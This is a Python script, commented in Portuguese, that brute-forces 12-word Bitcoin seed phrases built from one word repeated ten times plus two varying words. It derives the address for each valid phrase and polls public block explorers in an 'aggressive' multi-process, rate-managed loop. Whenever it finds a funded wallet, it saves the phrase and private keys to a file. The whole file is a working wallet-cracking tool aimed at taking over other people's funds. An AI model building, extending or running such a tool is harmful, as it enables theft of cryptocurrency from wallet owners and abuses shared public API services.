#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
realfindbitcoin.py — Modo SUPER-AGRESSIVO (versão com var1/var2 independentes)

Alterações principais nesta versão:
- Mantém todas as proteções/adaptações (asyncio + aiohttp, ProcessPoolExecutor, rate limiter, backoff, multi-API).
- Agora gera mnemonics no padrão: [base]*10 + [var1] + [var2], com var1 e var2 iterando **independentemente** (nested loops).
- Checkpoint/ultimo.txt continuam salvando as 12 palavras (10x base + var1 + var2) e o script retoma corretamente do trio (base, var1, var2).
"""
import os
import time
import random
import asyncio
import aiohttp
import threading
from typing import Optional, Tuple, List, Dict
from concurrent.futures import ProcessPoolExecutor
from bip_utils import Bip39SeedGenerator, Bip39MnemonicValidator
from bip_utils import Bip44, Bip44Coins, Bip44Changes

# ------------------------
# MODO SUPER-AGRESSIVO (ajuste se quiser)
# ------------------------
CHECKPOINT_FILE = "checkpoint.txt"
ULTIMO_FILE = "ultimo.txt"
SALDO_FILE = "saldo.txt"
ESTATISTICAS_FILE = "estatisticas_finais.txt"

FREQUENCY_PRINT = 10
FREQUENCY_SAVE = 10
SAVE_INTERVAL_SEC = 15

# AGGRESSIVE PARAMETERS
CONCURRENCY_LIMIT = 32        # tasks async I/O ativas
PER_HOST_CONCURRENCY = 16     # connections per host
BASE_TOKENS = 12              # RPS initial (aggressive)
TOKEN_BUCKET_CAP = 60         # burst capacity
MAX_RETRIES = 6
INITIAL_BACKOFF = 1.0

# Adaptive controls
ADAPTIVE_WINDOW = 20
ADAPTIVE_THRESHOLD = 0.05
ADAPTIVE_REDUCTION = 0.4
ADAPTIVE_RECOVER_STEP = 0.15
ADAPTIVE_RECOVER_INTERVAL = 5

# CPU workers (~90% logical processors)
_CPU_COUNT = os.cpu_count() or 1
PROCESS_POOL_WORKERS = max(1, int(_CPU_COUNT * 0.90))

# Explorer list (fallback)
EXPLORER_APIS = [
    "https://mempool.space/api/address/",
    "https://blockstream.info/api/address/",
    "https://api.blockcypher.com/v1/btc/main/addrs/"
]

# locks / counters
_stats_lock = threading.Lock()
_file_lock = threading.Lock()
_request_lock = threading.Lock()

_request_count = 0
_successful_http = 0
_http_status_counts = {}

# ------------------------
# atomic I/O helpers
# ------------------------
def atomic_write(path: str, content: str, encoding='utf-8'):
    tmp = path + ".tmp"
    with open(tmp, "w", encoding=encoding) as f:
        f.write(content)
        f.flush()
        try:
            os.fsync(f.fileno())
        except Exception:
            pass
    os.replace(tmp, path)

def append_and_sync(path: str, text: str, encoding='utf-8'):
    with open(path, "a", encoding=encoding) as f:
        f.write(text)
        f.flush()
        try:
            os.fsync(f.fileno())
        except Exception:
            pass

# ------------------------
# load / checkpoint / save
# ------------------------
def carregar_palavras_bip39(arquivo="bip39-words.txt"):
    if not os.path.exists(arquivo):
        raise FileNotFoundError(f"Arquivo {arquivo} não encontrado! Coloque bip39-words.txt na pasta.")
    with open(arquivo, 'r', encoding='utf-8') as f:
        palavras = [l.strip() for l in f.readlines() if l.strip()]
    if len(palavras) != 2048:
        print(f"Aviso: Esperadas 2048 palavras, encontradas {len(palavras)}")
    return palavras

def carregar_ultima_combinacao(arquivo=ULTIMO_FILE) -> Tuple[Optional[str], Optional[str], Optional[str], Optional[str]]:
    """
    Retorna (palavra_base, palavra_var1, palavra_var2, mnemonic) se ultimo.txt estiver no formato esperado:
    10x base + var1 + var2 (12 palavras no total) e as primeiras 10 iguais.
    """
    if not os.path.exists(arquivo):
        return None, None, None, None
    try:
        with open(arquivo, 'r', encoding='utf-8') as f:
            palavras = f.read().strip().split()
            if len(palavras) == 12:
                palavra_base = palavras[0]
                if all(p == palavra_base for p in palavras[:10]):
                    return palavra_base, palavras[10], palavras[11], " ".join(palavras)
    except Exception:
        pass
    return None, None, None, None

def carregar_estatisticas_checkpoint(arquivo=CHECKPOINT_FILE):
    contador_total = contador_validas = carteiras_com_saldo = 0
    if not os.path.exists(arquivo):
        salvar_checkpoint(arquivo, 0, "", 0, 0, 0)
        return contador_total, contador_validas, carteiras_com_saldo
    try:
        with open(arquivo, 'r', encoding='utf-8') as f:
            for line in f:
                if "Total de combinações testadas:" in line:
                    try: contador_total = int(line.split(":")[1].strip())
                    except: contador_total = 0
                elif "Combinações válidas:" in line:
                    try: contador_validas = int(line.split(":")[1].strip())
                    except: contador_validas = 0
                elif "Carteiras com saldo:" in line:
                    try: carteiras_com_saldo = int(line.split(":")[1].strip())
                    except: carteiras_com_saldo = 0
    except Exception as e:
        print(f"Erro ao ler checkpoint: {e}")
    return contador_total, contador_validas, carteiras_com_saldo

def encontrar_proxima_combinacao(palavras, ultima_base, ultima_completa1, ultima_completa2):
    """
    Agora retorna indices para (base_idx, var1_idx, var2_idx) seguindo a lógica nested:
    - primeiro avança var2 (j2 + 1)
    - se var2 atingir o fim, avança var1 (j1 + 1) e reseta var2 = 0
    - se var1 atingir o fim, avança base (i + 1) e reseta var1=0,var2=0
    """
    try:
        base_idx = palavras.index(ultima_base)
        var1_idx = palavras.index(ultima_completa1)
        var2_idx = palavras.index(ultima_completa2)

        # Avança var2 primeiro
        if var2_idx + 1 < len(palavras):
            return base_idx, var1_idx, var2_idx + 1
        # Avança var1 e zera var2
        if var1_idx + 1 < len(palavras):
            return base_idx, var1_idx + 1, 0
        # Avança base e zera var1/var2
        if base_idx + 1 < len(palavras):
            return base_idx + 1, 0, 0
        # acabou tudo
        return None, None, None
    except ValueError:
        return 0, 0, 0

def salvar_ultima_combinacao(arquivo=ULTIMO_FILE, palavra_base="", palavra_completa1="", palavra_completa2=""):
    palavras = [palavra_base] * 10 + [palavra_completa1, palavra_completa2]
    mnemonic = " ".join(palavras)
    with _file_lock:
        atomic_write(arquivo, mnemonic)

def salvar_checkpoint(arquivo=CHECKPOINT_FILE, base_idx=0, palavra_base="", contador_total=0, contador_validas=0, carteiras_com_saldo=0):
    texto = (
        f"Última palavra base testada: {base_idx + 1} ({palavra_base})\n"
        f"Total de combinações testadas: {contador_total}\n"
        f"Combinações válidas: {contador_validas}\n"
        f"Carteiras com saldo: {carteiras_com_saldo}\n"
    )
    with _file_lock:
        atomic_write(arquivo, texto)

def salvar_carteira_com_saldo(palavra_base, palavra_completa1, palavra_completa2, mnemonic, info):
    texto = (
        f"Palavra Base: {palavra_base} (repetida 10x)\n"
        f"Palavras Finais: {palavra_completa1}, {palavra_completa2}\n"
        f"Mnemonic: {mnemonic}\n"
        f"Endereço: {info['address']}\n"
        f"Chave Privada (WIF): {info['wif']}\n"
        f"Chave Privada (HEX): {info['priv_hex']}\n"
        f"Chave Pública: {info['pub_compressed_hex']}\n"
        + "-" * 80 + "\n\n"
    )
    with _file_lock:
        append_and_sync(SALDO_FILE, texto)
    print("🎉 CARTEIRA COM SALDO SALVA! 🎉")

# ------------------------
# CPU funcs
# ------------------------
def criar_mnemonic_repetido(palavra_base, palavra_completa1, palavra_completa2):
    return " ".join([palavra_base] * 10 + [palavra_completa1, palavra_completa2])

def validar_mnemonic(mnemonic):
    try:
        return Bip39MnemonicValidator().IsValid(mnemonic)
    except Exception:
        return False

def mnemonic_para_seed(mnemonic: str, passphrase: str = "") -> bytes:
    seed_gen = Bip39SeedGenerator(mnemonic)
    return seed_gen.Generate(passphrase)

def derivar_bip44_btc(seed: bytes):
    bip44_mst_ctx = Bip44.FromSeed(seed, Bip44Coins.BITCOIN)
    acct = bip44_mst_ctx.Purpose().Coin().Account(0)
    change = acct.Change(Bip44Changes.CHAIN_EXT)
    return change.AddressIndex(0)

def mostrar_info(addr_index):
    priv_key_obj = addr_index.PrivateKey()
    pub_key_obj = addr_index.PublicKey()
    return {
        "priv_hex": priv_key_obj.Raw().ToHex(),
        "wif": priv_key_obj.ToWif(),
        "pub_compressed_hex": pub_key_obj.RawCompressed().ToHex(),
        "address": addr_index.PublicKey().ToAddress()
    }

def derive_info_from_mnemonic(mnemonic: str) -> Dict[str, str]:
    # definido no topo-level para ser picklable pelo ProcessPoolExecutor
    from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes
    seed_gen = Bip39SeedGenerator(mnemonic)
    seed = seed_gen.Generate()
    bip44_ctx = Bip44.FromSeed(seed, Bip44Coins.BITCOIN)
    acct = bip44_ctx.Purpose().Coin().Account(0)
    change = acct.Change(Bip44Changes.CHAIN_EXT)
    addr_index = change.AddressIndex(0)
    priv_key_obj = addr_index.PrivateKey()
    pub_key_obj = addr_index.PublicKey()
    return {
        "priv_hex": priv_key_obj.Raw().ToHex(),
        "wif": priv_key_obj.ToWif(),
        "pub_compressed_hex": pub_key_obj.RawCompressed().ToHex(),
        "address": addr_index.PublicKey().ToAddress()
    }

# ------------------------
# Rate limiter (token-bucket) + adaptive tracker
# ------------------------
class AsyncRateLimiter:
    def __init__(self, rate: float, capacity: int):
        self.base_rate = float(rate)
        self.rate = float(rate)
        self.capacity = int(capacity)
        self._tokens = float(self.capacity)
        self._last = time.monotonic()
        self._lock = asyncio.Lock()

    async def acquire(self):
        async with self._lock:
            now = time.monotonic()
            elapsed = now - self._last
            refill = elapsed * self.rate
            if refill > 0:
                self._tokens = min(self.capacity, self._tokens + refill)
                self._last = now
            if self._tokens >= 1.0:
                self._tokens -= 1.0
                return
            needed = 1.0 - self._tokens
            wait = needed / self.rate if self.rate > 0 else 0.1
        await asyncio.sleep(wait)
        await self.acquire()

    async def set_rate(self, new_rate: float, new_capacity: Optional[int] = None):
        async with self._lock:
            self.rate = float(new_rate)
            if new_capacity is not None:
                self.capacity = int(new_capacity)
            self._tokens = min(self._tokens, self.capacity)

    async def recover_toward_base(self, step_fraction: float):
        async with self._lock:
            if self.rate < self.base_rate:
                diff = self.base_rate - self.rate
                self.rate += max(diff * step_fraction, 0.01)
                if self.rate > self.base_rate:
                    self.rate = self.base_rate

class Adaptive429Tracker:
    def __init__(self, window_seconds: int = ADAPTIVE_WINDOW):
        self.window = window_seconds
        self.events = []
        self.lock = asyncio.Lock()

    async def add(self, is_429: bool):
        async with self.lock:
            now = time.monotonic()
            self.events.append((now, 1 if is_429 else 0))
            cutoff = now - self.window
            while self.events and self.events[0][0] < cutoff:
                self.events.pop(0)

    async def ratio_429(self) -> float:
        async with self.lock:
            if not self.events:
                return 0.0
            total = len(self.events)
            c429 = sum(x[1] for x in self.events)
            return c429 / total if total > 0 else 0.0

rate_limiter = AsyncRateLimiter(rate=BASE_TOKENS, capacity=TOKEN_BUCKET_CAP)
adaptive_tracker = Adaptive429Tracker()

_per_host_semaphores = {}
_per_host_lock = asyncio.Lock()

async def get_host_semaphore(host: str, limit: int):
    async with _per_host_lock:
        sem = _per_host_semaphores.get(host)
        if sem is None:
            sem = asyncio.Semaphore(limit)
            _per_host_semaphores[host] = sem
        return sem

async def adaptive_recovery_loop():
    while True:
        try:
            ratio = await adaptive_tracker.ratio_429()
            if ratio < (ADAPTIVE_THRESHOLD / 2):
                await rate_limiter.recover_toward_base(ADAPTIVE_RECOVER_STEP)
        except Exception:
            pass
        await asyncio.sleep(ADAPTIVE_RECOVER_INTERVAL)

# ------------------------
# Async HTTP with backoff + fallback + counters
# ------------------------
async def verificar_saldo_explorer(session: aiohttp.ClientSession, endereco: str, timeout: int = 10) -> bool:
    global _request_count, _successful_http, _http_status_counts

    # immediate adaptation: if many 429 recently, reduce rate now
    try:
        ratio = await adaptive_tracker.ratio_429()
        if ratio > ADAPTIVE_THRESHOLD:
            new_rate = max(0.2, rate_limiter.rate * ADAPTIVE_REDUCTION)
            await rate_limiter.set_rate(new_rate)
    except Exception:
        pass

    apis = EXPLORER_APIS.copy()
    random.shuffle(apis)
    backoff = INITIAL_BACKOFF

    for attempt in range(1, MAX_RETRIES + 1):
        api_url = random.choice(apis)
        url = api_url + endereco
        host = api_url.split("//")[-1].split("/")[0]

        sem = await get_host_semaphore(host, PER_HOST_CONCURRENCY)
        await rate_limiter.acquire()

        async with sem:
            with _request_lock:
                _request_count += 1
                req_id = _request_count

            headers = {"User-Agent": "realfindbitcoin/aggressive"}
            try:
                start = time.monotonic()
                async with session.get(url, timeout=timeout, headers=headers) as resp:
                    elapsed = time.monotonic() - start
                    status = resp.status
                    with _request_lock:
                        _http_status_counts[status] = _http_status_counts.get(status, 0) + 1

                    if status == 200:
                        try:
                            data = await resp.json(content_type=None)
                        except Exception:
                            await adaptive_tracker.add(False)
                            return False

                        chain = data.get("chain_stats", {}) or {}
                        mempool = data.get("mempool_stats", {}) or {}
                        funded_chain = int(chain.get("funded_txo_sum", 0))
                        spent_chain = int(chain.get("spent_txo_sum", 0))
                        funded_mp = int(mempool.get("funded_txo_sum", 0))
                        spent_mp = int(mempool.get("spent_txo_sum", 0))
                        balance = (funded_chain - spent_chain) + (funded_mp - spent_mp)

                        if "blockcypher" in api_url:
                            try:
                                final = int(data.get("final_balance", 0))
                                balance = max(balance, final)
                            except Exception:
                                pass

                        with _request_lock:
                            _successful_http += 1
                        await adaptive_tracker.add(False)
                        return balance > 0

                    elif status == 429:
                        print(f"🟡 HTTP #{req_id} {host} -> 429 (attempt {attempt}/{MAX_RETRIES}) elapsed={elapsed:.2f}s")
                        await adaptive_tracker.add(True)
                        retry_after = resp.headers.get("Retry-After")
                        if retry_after:
                            try:
                                wait = float(retry_after)
                            except Exception:
                                wait = backoff + random.uniform(0, backoff * 0.4)
                        else:
                            wait = backoff + random.uniform(0, backoff * 0.4)
                        backoff = min(backoff * 2, 90.0)
                        await asyncio.sleep(wait)
                        continue

                    elif 500 <= status < 600:
                        await adaptive_tracker.add(False)
                        wait = backoff + random.uniform(0, backoff * 0.25)
                        backoff = min(backoff * 2, 90.0)
                        print(f"🟠 {host} respondeu {status}. Retentando em {wait:.2f}s")
                        await asyncio.sleep(wait)
                        continue

                    else:
                        await adaptive_tracker.add(False)
                        return False

            except asyncio.TimeoutError:
                await adaptive_tracker.add(False)
                wait = backoff + random.uniform(0, backoff * 0.25)
                backoff = min(backoff * 2, 90.0)
                print(f"🔴 Timeout ao consultar {host} (attempt {attempt}/{MAX_RETRIES}), esperando {wait:.2f}s")
                await asyncio.sleep(wait)
                continue
            except aiohttp.ClientError as e:
                await adaptive_tracker.add(False)
                wait = backoff + random.uniform(0, backoff * 0.25)
                backoff = min(backoff * 2, 90.0)
                print(f"🔴 Erro de conexão ao consultar {host}: {e} (attempt {attempt}/{MAX_RETRIES}). Esperando {wait:.2f}s")
                await asyncio.sleep(wait)
                continue
            except Exception as e:
                await adaptive_tracker.add(False)
                print(f"🔴 Erro inesperado ao consultar {host}: {e}")
                return False

    return False

# ------------------------
# pipeline: derive (process pool) -> async check
# ------------------------
async def handle_valid_mnemonic(loop: asyncio.AbstractEventLoop, process_pool: ProcessPoolExecutor,
                                semaphore: asyncio.Semaphore, session: aiohttp.ClientSession,
                                mnemonic: str, palavra_base: str, palavra_completa1: str, palavra_completa2: str,
                                stats: dict):
    try:
        info = await loop.run_in_executor(process_pool, derive_info_from_mnemonic, mnemonic)
    except Exception as e:
        print(f"Erro na derivação em process pool: {e}")
        return

    tem_saldo = await verificar_saldo_explorer(session, info["address"])

    with _stats_lock:
        stats['validas'] += 1
        if tem_saldo:
            stats['saldos'] += 1

    if tem_saldo:
        salvar_carteira_com_saldo(palavra_base, palavra_completa1, palavra_completa2, mnemonic, info)

# ------------------------
# main async
# ------------------------
async def async_main():
    print("Iniciando realfindbitcoin.py (SUPER-AGRESSIVO) — var1/var2 independentes")
    try:
        palavras = carregar_palavras_bip39("bip39-words.txt")
        print(f"Carregadas {len(palavras)} palavras BIP39")
    except FileNotFoundError as e:
        print(e)
        return

    ultima_base, ultima_completa1, ultima_completa2, ultimo_mnemonic = carregar_ultima_combinacao(ULTIMO_FILE)
    contador_total, contador_validas, carteiras_com_saldo = carregar_estatisticas_checkpoint(CHECKPOINT_FILE)

    print(f"\nEstatísticas carregadas:\n  Total testadas: {contador_total}\n  Válidas: {contador_validas}\n  Com saldo: {carteiras_com_saldo}\n")

    if ultima_base is not None and ultima_completa1 is not None and ultima_completa2 is not None:
        print(f"Última combinação testada: {ultimo_mnemonic}")
        base_idx, var1_idx, var2_idx = encontrar_proxima_combinacao(palavras, ultima_base, ultima_completa1, ultima_completa2)
        if base_idx is None:
            print("Todas as combinações já foram testadas!")
            return
    else:
        base_idx, var1_idx, var2_idx = 0, 0, 0
        print("Nenhum checkpoint encontrado, começando do início...\n")

    print(f"Continuando de '{palavras[base_idx]}' (base), iniciando variação var1#{var1_idx+1}, var2#{var2_idx+1}.")
    print("\nIniciando geração de combinações 10+2 BIP39 (agressivo, var1/var2 independentes)...\n")

    ultimo_salvamento_tempo = time.time()
    stats = {'validas': contador_validas, 'saldos': carteiras_com_saldo}

    semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
    tasks: List[asyncio.Task] = []

    final_i = base_idx
    palavra_base = palavras[base_idx]

    connector = aiohttp.TCPConnector(limit_per_host=PER_HOST_CONCURRENCY)
    process_pool = ProcessPoolExecutor(max_workers=PROCESS_POOL_WORKERS)
    loop = asyncio.get_running_loop()

    recovery_task = asyncio.create_task(adaptive_recovery_loop())

    async with aiohttp.ClientSession(connector=connector) as session:
        try:
            for i in range(base_idx, len(palavras)):
                palavra_base = palavras[i]
                start_j1 = var1_idx if i == base_idx else 0

                for j1 in range(start_j1, len(palavras)):
                    palavra_completa1 = palavras[j1]
                    # se estamos retomando e j1 == start_j1, var2 começa no var2_idx; senão começa em 0
                    start_j2 = var2_idx if (i == base_idx and j1 == start_j1) else 0

                    for j2 in range(start_j2, len(palavras)):
                        palavra_completa2 = palavras[j2]
                        contador_total += 1

                        mnemonic = criar_mnemonic_repetido(palavra_base, palavra_completa1, palavra_completa2)

                        salvar_ultima_combinacao(ULTIMO_FILE, palavra_base, palavra_completa1, palavra_completa2)

                        now = time.time()
                        if now - ultimo_salvamento_tempo > SAVE_INTERVAL_SEC or contador_total % FREQUENCY_SAVE == 0:
                            salvar_checkpoint(CHECKPOINT_FILE, i, palavra_base, contador_total, stats['validas'], stats['saldos'])
                            ultimo_salvamento_tempo = now

                        if contador_total % FREQUENCY_PRINT == 0:
                            with _request_lock:
                                reqs = _request_count
                                succ = _successful_http
                            with _stats_lock:
                                v = stats['validas']
                                s = stats['saldos']
                            print(f"Testadas {contador_total} combinações | Última: {mnemonic}")
                            print(f"  Válidas: {v} | Com saldo: {s} | HTTP reqs: {reqs} (succ {succ})")
                            with _request_lock:
                                status_snapshot = dict(_http_status_counts)
                            if status_snapshot:
                                print(f"  HTTP status counts: {status_snapshot}")
                            print(f"  Current RPS: {rate_limiter.rate:.2f} (base {rate_limiter.base_rate})")

                        if validar_mnemonic(mnemonic):
                            task = asyncio.create_task(handle_valid_mnemonic(loop, process_pool, semaphore, session,
                                                                            mnemonic, palavra_base, palavra_completa1, palavra_completa2, stats))
                            tasks.append(task)

                            if len(tasks) > CONCURRENCY_LIMIT * 12:
                                done, pending = await asyncio.wait(tasks, timeout=0.01, return_when=asyncio.FIRST_COMPLETED)
                                tasks = list(pending)

                    # fim loop j2
                    # quando avançamos j1, ao retomar var2 deve começar de 0 (já tratado por start_j2 logic)
                    var2_idx = 0

                # fim loop j1
                var1_idx = 0
                salvar_checkpoint(CHECKPOINT_FILE, i, palavra_base, contador_total, stats['validas'], stats['saldos'])
                print(f"\nConcluído para '{palavra_base}': Válidas até agora: {stats['validas']}, Com saldo: {stats['saldos']}\n")
                final_i = i

        except KeyboardInterrupt:
            print("\n🟡 Execução interrompida manualmente. Salvando progresso...")

        finally:
            print("🟢 Aguardando finalização das tasks pendentes (derivação + consultas)...")
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)

    try:
        recovery_task.cancel()
    except Exception:
        pass

    try:
        process_pool.shutdown(wait=True)
    except Exception:
        pass

    final_base_idx = final_i if 'final_i' in locals() else 0
    final_palavra_base = palavra_base if 'palavra_base' in locals() else ""
    salvar_checkpoint(CHECKPOINT_FILE, final_base_idx, final_palavra_base, contador_total, stats['validas'], stats['saldos'])

    with open(ESTATISTICAS_FILE, "w", encoding='utf-8') as f:
        f.write("ESTATÍSTICAS FINAIS\n" + "=" * 50 + "\n")
        f.write(f"Total testadas: {contador_total}\n")
        f.write(f"Válidas: {stats['validas']}\n")
        f.write(f"Com saldo: {stats['saldos']}\n")
        with _request_lock:
            f.write(f"HTTP requests: {_request_count}\n")
            f.write(f"HTTP successes: {_successful_http}\n")
            f.write(f"HTTP status counts: {_http_status_counts}\n")

    print("\n✅ Execução finalizada. Estatísticas gravadas em", ESTATISTICAS_FILE)
    print(f"Total testadas: {contador_total} | Válidas: {stats['validas']} | Com saldo: {stats['saldos']}")

# Entrypoint
def main():
    print(f"Logical CPUs detected: {_CPU_COUNT} -> Process workers: {PROCESS_POOL_WORKERS}")
    print(f"AGGRESSIVE PROFILE: BASE_TOKENS={BASE_TOKENS}, CONCURRENCY_LIMIT={CONCURRENCY_LIMIT}, PER_HOST={PER_HOST_CONCURRENCY}")
    try:
        asyncio.run(async_main())
    except Exception as e:
        print(f"ERRO CRÍTICO: {e}")

if __name__ == "__main__":
    main()
